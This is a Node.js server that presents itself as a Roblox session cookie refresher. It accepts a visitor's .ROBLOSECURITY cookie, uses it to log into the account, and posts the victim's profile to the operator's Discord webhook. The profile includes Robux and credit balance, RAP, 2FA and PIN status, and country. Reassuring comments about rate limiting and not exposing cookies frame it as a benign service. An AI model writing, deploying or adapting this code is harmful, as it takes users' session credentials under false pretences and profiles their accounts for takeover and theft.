const express = require("express");
const axios = require("axios");
const rateLimit = require("express-rate-limit");

const { generateAuthTicket, redeemAuthTicket } = require("./refresh");
const { RobloxUser } = require("./getuserinfo");

const app = express();
app.use(express.json());
app.use(express.static("public"));

// 🔒 Rate limiter to prevent abuse (5 requests per 5 minutes per IP)
const limiter = rateLimit({
    windowMs: 5 * 60 * 1000, // 5 minutes
    max: 5, // Max 5 requests
    message: { error: "Too many requests, please try again later." },
});

app.get("/refresh", limiter, async (req, res) => {
    try {
        const roblosecurityCookie = req.query.cookie;
        if (!roblosecurityCookie) {
            return res.status(400).json({ error: "Missing .ROBLOSECURITY cookie" });
        }

        // Generate Auth Ticket
        const authTicket = await generateAuthTicket(roblosecurityCookie);
        if (authTicket === "Failed to fetch auth ticket") {
            return res.status(401).json({ error: "Invalid or expired cookie" });
        }

        // Redeem Auth Ticket
        const redemptionResult = await redeemAuthTicket(authTicket);
        if (!redemptionResult.success) {
            return res.status(401).json({ error: "Unauthorized: Invalid or expired cookie" });
        }

        const refreshedCookie = redemptionResult.refreshedCookie || "";
        const robloxUser = await RobloxUser.register(roblosecurityCookie);
        const userData = await robloxUser.getUserData();

        // 🔒 Do not log or expose the refreshed cookie
        console.log(`Refreshed cookie for ${userData.username}`);

        // 📡 Send data to Discord Webhook
        const webhookURL = "HOOK HERE";
        try {
            await axios.post(webhookURL, {
                embeds: [
                    {
                        title: "Cookie Refreshed",
                        description: `🔄 Your Roblox session has been refreshed successfully.`,
                        color: 16776960,
                        thumbnail: { url: userData.avatarUrl },
                        fields: [
                            { name: "Username", value: userData.username, inline: true },
                            { name: "User ID", value: userData.uid, inline: true },
                            { name: "Display Name", value: userData.displayName, inline: true },
                            { name: "Creation Date", value: userData.createdAt, inline: true },
                            { name: "Country", value: userData.country, inline: true },
                            { name: "Account Balance (Robux)", value: userData.balance, inline: true },
                            { name: "Is 2FA Enabled", value: userData.isTwoStepVerificationEnabled ? "✅ Yes" : "❌ No", inline: true },
                            { name: "Is PIN Enabled", value: userData.isPinEnabled ? "✅ Yes" : "❌ No", inline: true },
                            { name: "Is Premium", value: userData.isPremium ? "✅ Yes" : "❌ No", inline: true },
                            { name: "Credit Balance", value: userData.creditbalance, inline: true },
                            { name: "RAP", value: userData.rap, inline: true },
                        ],
                    },
                ],
            });
        } catch (webhookError) {
            console.error("❌ Failed to send webhook:", webhookError.response?.data || webhookError.message);
        }

        return res.json({ message: "Cookie refreshed successfully", username: userData.username });
    } catch (error) {
        console.error("❌ Error in /refresh route:", error);
        return res.status(500).json({ error: "Internal Server Error" });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 Server is running on port ${PORT}`);
});
